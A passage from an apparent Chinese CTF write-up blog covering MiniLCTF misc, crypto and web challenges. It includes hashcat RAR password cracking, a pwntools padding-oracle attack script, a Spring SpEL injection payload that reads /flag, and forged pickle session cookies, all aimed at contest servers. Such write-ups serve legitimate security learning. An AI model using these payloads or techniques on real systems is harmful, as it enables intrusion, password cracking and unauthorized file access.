title="尝试"></a><strong>尝试</strong></h3><p>首先输入的不能为奇数，不然二进制最低位都是1，电脑抓的猫猫就都为1，一直偶数抓下去就必输。其次我们输入的偶数要让电脑抓的是奇数，然后我们输入1，这样才能使剩余的为奇数，我们一直抓一直猫猫就必赢了。</p><p>怎么才能使电脑抓的使奇数呢？</p><p>就牵扯到二进制最低位了，举个列子，不用完全搞懂，实验是真理的唯一标准！</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>我的XDU一共是是150个猫猫，CDCQ抓到34个猫猫，还剩116个。</p><p>116的二进制是111 0100，所以他的最低位是100，就是2的2次方为4。</p><p>所以我们输入二进制最低位4，直接爆出奇数。</p><p>其实用上面的公式也可以n-1为奇数，太抽象了。。。原理我这个数学渣渣也不知道</p><p>n 是 2 的幂时，计算二进制位，就可以拿到flag了。</p><ol><li><h2 id="好康的硬盘"><a href="#好康的硬盘" class="headerlink" title="好康的硬盘"></a>好康的硬盘</h2></li></ol><p>文件zip打开flag.txt一看什么都没有就是零宽隐写也可以到kali的vim里面去验证</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">解密网站</a>很多解密出来<code>minil****</code></p><p>rar5用工具好像爆破不出来，用kali里面的rar2john+hashcat。正巧上次用来爆破word文档密码。</p><p><code>rar2john luoqian.rar</code>生成rar的hash值保存在test.hash里面。注意是这个格式<code>$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942</code></p><p>然后用<code>hashcat -m 13000 -a 3 test.hash minil?a?a?a?a </code> 慢慢跑。</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222222.jpg"></p><p>密码:<code>minil4396</code> </p><p>解压是个img镜像文件，因为不是取证，用看磁盘的工具就行，正巧我上次又下载了一个能搞硬盘的工具(X-Ways Forensics)打开</p><p>![](<a href="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</a> (1).png)选择转为磁盘</p><p>![](<a href="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</a> (1).png)选择分区1浏览即可</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639481727(1).jpg"></p><p>有两个可疑的文件，MP4确实挺好看，但注意到了中间有几张图片。</p><p>所以进行分离。正好X-Ways Forensics有自带的分离，点击MP4右击抽取连续的帧。从0开始，帧数有点多9999够了，其他的默认。慢慢找，一个图片里都有一个密码，全部找到就行了。</p><p>密码：<code>7355608</code> </p><p>最后还有一个邮件，估计使用里面的内容解密flag</p><p>是一堆奇怪的英文。这个txt题目是奇怪的邮件，把内容全部往谷歌里一丢，找到<a href="https://www.spammimic.com/">垃圾邮件隐写</a>。输入密码，解密就有flag</p><p><code>MiniLCTF&#123;n3ver_g0nna_L3t_Y0u_dowN&#125;</code></p><ol><li><h2 id="Recombination"><a href="#Recombination" class="headerlink" title="Recombination"></a>Recombination</h2></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222.jpg"></p><p>图片zip压缩包，改一下就行，伪加密1改成0。</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/0000.jpg"></p><p>得到一串字符。尝试了转16进制，shellcode等常规操作。无果。</p><p>后来在一篇<a href="https://blog.csdn.net/mochu7777777/article/details/115276176">DASCTF三月赛的WP</a>中看到关于aa3d的内容，后来又搜到了<a href="https://john-doe.fun/bytectf-2020-misc-writeup/">ByteCTF 2020 Misc WP</a>,感觉字符串的重复情况相当类似。</p><p>用aa3d试了一样的，字符串长度为4559，那正好分解为47*97的矩阵。</p><p>放在记事本里，截图。将截图用stegsolve打开，使用<code>Analyze</code>&gt;<code>Stereogram Solver</code>，调整图片位移，看到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/111111.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/555555.jpg"></p><p>慢慢试就出来了。<code>MiniL&#123;A@3d-1s_Ar7!!&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="asr"><a href="#asr" class="headerlink" title="asr"></a>asr</h2><p>高低位一起dfs 。shallow之前的脚本拉出来改的。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d =inverse(e,phi)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p_q</span>():</span></span><br><span class="line">    p_low = [<span class="number">0</span>]</span><br><span class="line">    q_high = [<span class="number">0</span>]</span><br><span class="line">    q_low = [<span class="number">0</span>]</span><br><span class="line">    p_high = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    si = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x_lowbits = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        n_lowbits = (n % maskn)</span><br><span class="line">        tmppp_low = []</span><br><span class="line">        tmpqq_low = []</span><br><span class="line">        tmppp_high =[]</span><br><span class="line">        tmpqq_high =[]</span><br><span class="line">        x_highbits = (x &gt;&gt; (<span class="number">511</span>-i)) &amp; <span class="number">1</span></span><br><span class="line">        n_highbits = (n)&gt;&gt; (<span class="number">1022</span> - <span class="number">2</span>*i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p_low)):</span><br><span class="line">            <span class="keyword">for</span> pp_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> qq_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> pp_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> qq_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> pp_low ^ qq_high == x_lowbits <span class="keyword">and</span> qq_low ^ pp_high == x_highbits:</span><br><span class="line">                                temp1 = ((pp_low * maskn //<span class="number">2</span> + p_low[j]) * (qq_low * maskn // <span class="number">2</span> + q_low[j])) % maskn </span><br><span class="line">                                temp2 = (((pp_high &lt;&lt; (<span class="number">511</span>-i)) + p_high[j]) * ((qq_high &lt;&lt; (<span class="number">511</span>-i)) + q_high[j]))&gt;&gt;(<span class="number">1022</span>-<span class="number">2</span>*i)</span><br><span class="line">                                <span class="keyword">if</span> temp1 == n_lowbits :</span><br><span class="line">                                    <span class="keyword">if</span> n_highbits-temp2 &gt;= <span class="number">0</span>  <span class="keyword">and</span> n_highbits-temp2 &lt;=(<span class="number">2</span>&lt;&lt;i+<span class="number">1</span>):</span><br><span class="line">                                        <span class="comment">#print(&quot;down&quot;)</span></span><br><span class="line">                                        tmppp_low.append(pp_low * maskn //<span class="number">2</span> + p_low[j])</span><br><span class="line">                                        tmpqq_low.append(qq_low * maskn //<span class="number">2</span> + q_low[j])</span><br><span class="line">                                        tmppp_high.append((pp_high&lt;&lt;(<span class="number">511</span>-i))+p_high[j])</span><br><span class="line">                                        tmpqq_high.append((qq_high&lt;&lt;(<span class="number">511</span>-i))+q_high[j])</span><br><span class="line">                                        <span class="comment">#print(tmppp_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmppp_high)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_high)</span></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        p_low = tmppp_low</span><br><span class="line">        q_low = tmpqq_low</span><br><span class="line">        p_high = tmppp_high</span><br><span class="line">        q_high = tmpqq_high</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="built_in">len</span>(p_low))</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p_low:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> p_high:</span><br><span class="line">            <span class="keyword">if</span> n %(a+b) ==<span class="number">0</span>:</span><br><span class="line">                p = a + b</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n//p</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line">    c = <span class="number">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    x = <span class="number">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </span><br><span class="line">    p , q = get_p_q()</span><br><span class="line">    flag = get_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>miniLCTF&#123;reverse_1s_als0_e1sy&#125;&#39;</code></p><h2 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h2><p>原来那道题…想的是用base64去爆破大概的每位是啥…但是发现出的是32位哈希值 没法爆破，浪费了好一会时间… Padding Oracle…细节真难调…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_least_length</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        guess = <span class="string">b&#x27;\x00&#x27;</span> * i</span><br><span class="line">        c = b64decode(get_recv(guess))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            base = <span class="built_in">len</span>(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) != base:</span><br><span class="line">            <span class="keyword">return</span> base - <span class="number">16</span> - i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_recv</span>(<span class="params">x</span>):</span></span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(b64encode(x))</span><br><span class="line">    Res = io.recvuntil(<span class="string">b&#x27;flag;&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> Res[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message_last</span>(<span class="params">c</span>):</span></span><br><span class="line">    guess = long_to_bytes(<span class="number">66</span>) * <span class="number">239</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        G = guess + long_to_bytes(i)</span><br><span class="line">        io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        io.send(b64encode(G + c))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        io.send(b64encode(IV))</span><br><span class="line">        resp = io.recvuntil(<span class="string">b&#x27;flag;&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    IV = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    LengTh = <span class="number">0</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    M = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">    <span class="keyword">while</span> LengTh == <span class="literal">None</span> <span class="keyword">or</span> LengTh != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;pwn.archive.xdsec.chall.frankli.site&#x27;</span>, <span class="number">10088</span>)</span><br><span class="line">            io.recv()</span><br><span class="line">            LengTh = get_least_length()</span><br><span class="line">            <span class="built_in">print</span>(LengTh)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Length!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        pad = <span class="string">b&#x27;\x76&#x27;</span> * <span class="number">16</span> + (<span class="number">15</span> - i) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        res = get_recv(pad)</span><br><span class="line">        ciphertext.append(b64decode(res))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Ciphertext!!!&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            c16 = c[<span class="number">48</span>:<span class="number">64</span>]</span><br><span class="line">            M[-<span class="number">1</span>] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">47</span>])</span><br><span class="line">        c16 = c[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">        M[i] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">31</span>])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span>.join(M)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Message!!!&#x27;</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    io.send(b64encode(m))</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1111111.png"></p><p><code>xdsec&#123;f3e2f3fd-afd1-4e02-90ed-d02e9cd4caba&#125;</code></p><h2 id="土块"><a href="#土块" class="headerlink" title="土块"></a>土块</h2><p>把题目中的<code>game</code>函数拿出来研究，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tukuai <span class="keyword">import</span> game</span><br><span class="line">cheat=[[<span class="number">9</span>,[<span class="number">1</span>,<span class="number">0</span>]],[<span class="number">9</span>,[<span class="number">0</span>,<span class="number">1</span>]]]</span><br><span class="line">init_state = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">coin1 = randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">coin2 = randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">temp = coin1 * <span class="number">2</span> + coin2</span><br><span class="line">init_state[temp] = <span class="number">1</span></span><br><span class="line">servercoin,qc = game(cheat, init_state)</span><br><span class="line"><span class="built_in">print</span>(coin1)</span><br><span class="line"><span class="built_in">print</span>(coin2)</span><br><span class="line"><span class="built_in">print</span>(init_state)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my coin is &#x27;</span> + <span class="built_in">str</span>(servercoin) + <span class="string">&#x27; your coin is?&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> qiskit.tools.visualization <span class="keyword">import</span> plot_bloch_multivector</span><br><span class="line">display(plot_bloch_multivector(init_state))</span><br><span class="line">simulator=Aer.get_backend(<span class="string">&#x27;qasm_simulator&#x27;</span>)</span><br><span class="line">result=execute(qc,backend=simulator).result()</span><br><span class="line"><span class="keyword">from</span> qiskit.tools.visualization <span class="keyword">import</span> plot_histogram</span><br><span class="line">display(qc.draw(output=<span class="string">&#x27;mpl&#x27;</span>))</span><br><span class="line">display(plot_histogram(result.get_counts(qc)))</span><br></pre></td></tr></table></figure><p>画出几个图出来看看，只要绘出 bot 的输出 = my coin 的量子电路即可，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       ┌──────────────────────┐┌───┐        </span><br><span class="line">q12_0: ┤0                     ├┤ X ├──■─────</span><br><span class="line">       │  initialize(0,0,1,0) │└─┬─┘┌─┴─┐┌─┐</span><br><span class="line">q12_1: ┤1                     ├──■──┤ X ├┤M├</span><br><span class="line">       └──────────────────────┘     └───┘└╥┘</span><br><span class="line"> c1: 1/═══════════════════════════════════╩═</span><br><span class="line">                                          0 </span><br></pre></td></tr></table></figure><p>qubits…..量子计算学习….量子通信~ <a href="https://qiskit.org/textbook/preface.html%E7%BF%BB%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3">https://qiskit.org/textbook/preface.html翻官方文档</a> 复制让01输出01，10输出10 巧！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">Rec = <span class="keyword">lambda</span>  :p.recv()</span><br><span class="line">Sen = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">RecUntil = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecSen</span>(<span class="params">x</span>):</span></span><br><span class="line">    Rec()</span><br><span class="line">    Sen(x)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10095</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;lubenwei&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;1 0&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;0 1&quot;</span>)</span><br><span class="line">    Sen(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        RecUntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">        num = (p.recv(<span class="number">1</span>))</span><br><span class="line">        RecSen(<span class="built_in">str</span>(<span class="built_in">int</span>(num.decode())))</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(p.recvline()[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/76767.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>做这道题前，Java负基础(啥也不会,甚至怀疑人生) 题目打开给个压缩包，下载下来发现是一个Java的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</span><br><span class="line">    ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">main</span><span class="params">(HttpServletRequest request,<span class="meta">@RequestParam(required = false)</span> String code,<span class="meta">@RequestParam(required = false)</span> String url)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        String requestURI = request.getRequestURI();</span><br><span class="line">        <span class="keyword">if</span>(requestURI.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (code!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                String s = parser.parseExpression(code).getValue().toString();</span><br><span class="line">                <span class="keyword">return</span> s;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;so?&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==<strong>代码审计</strong>== 比较关键的一些知识点如下：</p><ul><li>@RequestMapping(‘/‘)</li><li>getRequestURI()</li><li>equals(“/“)</li><li>parser.parseExpression(code).getValue().toString()</li></ul><p>==<strong>解题思路</strong>== 由于代码很少，基础知识了解了，解题的思路也就出来了 首先，题目的描述中给了提示：<code>flag在/flag中</code>，利用给出的提示，拿到flag的方式无非有两种，通过命令执行，如<code>cat /flag</code>，或者直接通过文件读取，读取到<code>/flag</code>的内容<code>payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(&#39;/flag&#39;), T(java.nio.charset.Charset).defaultCharset())</code></p><p><code>flag:miniL&#123;edd0faa3-c21b-40da-ac82-53bf734299c9&#125;</code></p><h2 id="L-inc"><a href="#L-inc" class="headerlink" title="L inc."></a>L inc.</h2><p>经过一些尝试，得到题目的第一步应该是认证vip身份 抓包，看到cookie应该是base64:<code>gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==</code> 用python解一下：<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.&#39;</code> 结合PHP序列化的字符串，这个看起来也像是一个序列化字符串 实际上这就是python的序列化字符串，<code>cys</code>前是它的长度 用python的pickletools处理一下（注意到\x89是NEWFALSE 尝试一下\x90,\x88）可知<code>\x88</code>是NEWTRUE 将更改后的字符串base64encode，作为cookie 成功认证vip身份。 </p><p><img src="https://camo.githubusercontent.com/a54a8521d3be41470b88af434c3f865eec632998acba26f4124f44eaa551cdc7/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f31303636376238663337653937303462393232323333613835636238646465392e706e67"></p><p><img 